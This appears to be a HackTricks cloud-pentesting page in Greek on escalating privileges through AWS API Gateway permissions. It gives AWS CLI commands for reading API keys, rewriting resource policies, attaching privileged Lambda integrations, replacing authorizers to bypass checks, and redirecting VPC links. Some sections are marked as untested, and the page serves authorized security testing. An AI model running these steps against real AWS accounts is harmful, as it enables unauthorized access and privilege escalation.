# AWS - Apigateway Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Apigateway

Για περισσότερες πληροφορίες ελέγξτε:

{{#ref}}
../aws-services/aws-api-gateway-enum.md
{{#endref}}

### `apigateway:POST`

Με αυτή την άδεια μπορείτε να δημιουργήσετε κλειδιά API των APIs που είναι διαμορφωμένα (ανά περιοχή).
```bash
aws --region <region> apigateway create-api-key
```
**Πιθανές Επιπτώσεις:** Δεν μπορείτε να κάνετε privesc με αυτή την τεχνική αλλά μπορεί να αποκτήσετε πρόσβαση σε ευαίσθητες πληροφορίες.

### `apigateway:GET`

Με αυτή την άδεια μπορείτε να αποκτήσετε τα παραγόμενα API keys των APIs που είναι ρυθμισμένα (ανά περιοχή).
```bash
aws --region <region> apigateway get-api-keys
aws --region <region> apigateway get-api-key --api-key <key> --include-value
```
**Πιθανές Επιπτώσεις:** Δεν μπορείτε να αποκτήσετε δικαιώματα με αυτή την τεχνική, αλλά μπορεί να αποκτήσετε πρόσβαση σε ευαίσθητες πληροφορίες.

### `apigateway:UpdateRestApiPolicy`, `apigateway:PATCH`

Με αυτές τις άδειες είναι δυνατόν να τροποποιήσετε την πολιτική πόρων ενός API για να αποκτήσετε πρόσβαση στην κλήση του και να εκμεταλλευτείτε την πιθανή πρόσβαση που μπορεί να έχει το API gateway (όπως η εκτέλεση μιας ευάλωτης lambda).
```bash
aws apigateway update-rest-api \
--rest-api-id api-id \
--patch-operations op=replace,path=/policy,value='"{\"jsonEscapedPolicyDocument\"}"'
```
**Πιθανές Επιπτώσεις:** Συνήθως, δεν θα μπορείτε να κάνετε privesc άμεσα με αυτή την τεχνική, αλλά μπορεί να αποκτήσετε πρόσβαση σε ευαίσθητες πληροφορίες.

### `apigateway:PutIntegration`, `apigateway:CreateDeployment`, `iam:PassRole`

> [!NOTE]
> Χρειάζεται δοκιμή

Ένας επιτιθέμενος με τις άδειες `apigateway:PutIntegration`, `apigateway:CreateDeployment`, και `iam:PassRole` μπορεί **να προσθέσει μια νέα ολοκλήρωση σε μια υπάρχουσα API Gateway REST API με μια Lambda λειτουργία που έχει συνημμένο έναν IAM ρόλο**. Ο επιτιθέμενος μπορεί στη συνέχεια **να ενεργοποιήσει τη Lambda λειτουργία για να εκτελέσει αυθαίρετο κώδικα και ενδεχομένως να αποκτήσει πρόσβαση στους πόρους που σχετίζονται με τον IAM ρόλο**.
```bash
API_ID="your-api-id"
RESOURCE_ID="your-resource-id"
HTTP_METHOD="GET"
LAMBDA_FUNCTION_ARN="arn:aws:lambda:region:account-id:function:function-name"
LAMBDA_ROLE_ARN="arn:aws:iam::account-id:role/lambda-role"

# Add a new integration to the API Gateway REST API
aws apigateway put-integration --rest-api-id $API_ID --resource-id $RESOURCE_ID --http-method $HTTP_METHOD --type AWS_PROXY --integration-http-method POST --uri arn:aws:apigateway:region:lambda:path/2015-03-31/functions/$LAMBDA_FUNCTION_ARN/invocations --credentials $LAMBDA_ROLE_ARN

# Create a deployment for the updated API Gateway REST API
aws apigateway create-deployment --rest-api-id $API_ID --stage-name Prod
```
**Πιθανές Επιπτώσεις**: Πρόσβαση σε πόρους που σχετίζονται με τον ρόλο IAM της λειτουργίας Lambda.

### `apigateway:UpdateAuthorizer`, `apigateway:CreateDeployment`

> [!ΣΗΜΕΙΩΣΗ]
> Χρειάζεται δοκιμή

Ένας επιτιθέμενος με τις άδειες `apigateway:UpdateAuthorizer` και `apigateway:CreateDeployment` μπορεί να **τροποποιήσει έναν υπάρχοντα εξουσιοδοτητή API Gateway** για να παρακάμψει τους ελέγχους ασφαλείας ή να εκτελέσει αυθαίρετο κώδικα όταν γίνονται αιτήσεις API.
```bash
API_ID="your-api-id"
AUTHORIZER_ID="your-authorizer-id"
LAMBDA_FUNCTION_ARN="arn:aws:lambda:region:account-id:function:function-name"

# Update the API Gateway authorizer
aws apigateway update-authorizer --rest-api-id $API_ID --authorizer-id $AUTHORIZER_ID --authorizer-uri arn:aws:apigateway:region:lambda:path/2015-03-31/functions/$LAMBDA_FUNCTION_ARN/invocations

# Create a deployment for the updated API Gateway REST API
aws apigateway create-deployment --rest-api-id $API_ID --stage-name Prod
```
**Πιθανές Επιπτώσεις**: Παράκαμψη ελέγχων ασφαλείας, μη εξουσιοδοτημένη πρόσβαση σε πόρους API.

### `apigateway:UpdateVpcLink`

> [!NOTE]
> Χρειάζεται δοκιμή

Ένας επιτιθέμενος με την άδεια `apigateway:UpdateVpcLink` μπορεί να **τροποποιήσει έναν υπάρχοντα VPC Link ώστε να δείχνει σε διαφορετικό Network Load Balancer, ενδεχομένως ανακατευθύνοντας ιδιωτική κίνηση API σε μη εξουσιοδοτημένους ή κακόβουλους πόρους**.
```bash
bashCopy codeVPC_LINK_ID="your-vpc-link-id"
NEW_NLB_ARN="arn:aws:elasticloadbalancing:region:account-id:loadbalancer/net/new-load-balancer-name/50dc6c495c0c9188"

# Update the VPC Link
aws apigateway update-vpc-link --vpc-link-id $VPC_LINK_ID --patch-operations op=replace,path=/targetArns,value="[$NEW_NLB_ARN]"
```
**Πιθανές Επιπτώσεις**: Μη εξουσιοδοτημένη πρόσβαση σε ιδιωτικούς πόρους API, παρεμβολή ή διακοπή της κυκλοφορίας API.

{{#include ../../../banners/hacktricks-training.md}}
